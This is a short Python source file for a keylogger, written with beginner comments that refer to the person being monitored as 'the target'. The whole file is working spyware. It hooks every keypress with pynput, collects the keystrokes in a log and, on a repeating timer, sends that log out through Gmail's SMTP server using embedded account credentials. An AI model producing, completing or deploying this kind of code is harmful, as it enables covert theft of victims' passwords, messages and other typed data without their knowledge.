import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = 'Keylogger has started'  # This string will be first thing send in my email
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string  # Here i renamed the log to make it empty

    def process_key_press(self, key):

        try:
            current_key = str(key.char) # I tell python to try to run the charecters
        except AttributeError:  # I put this expect so i don't break my program if the target enter a specail char
            if key == key.space:    # The key.space where the space is store
                current_key = ' '
            else:   # This else won't break my program if the target enter any char instead of the space
                current_key = " " + str(key) + ' '
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)    # Here i choose the gmail by type "gmail" and put the server number
        server.starttls()   # I start sending email
        server.login(email, password)
        server.sendmail(email, email, message)  # In here i can put my email and from who to who and the message
        server.quit()

    def start(self):
        # The line below will store the target's chars "on_press" to call the function that has the work
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener: # With will make me able to run the keyboard listener
            self.report()
            keyboard_listener.join()
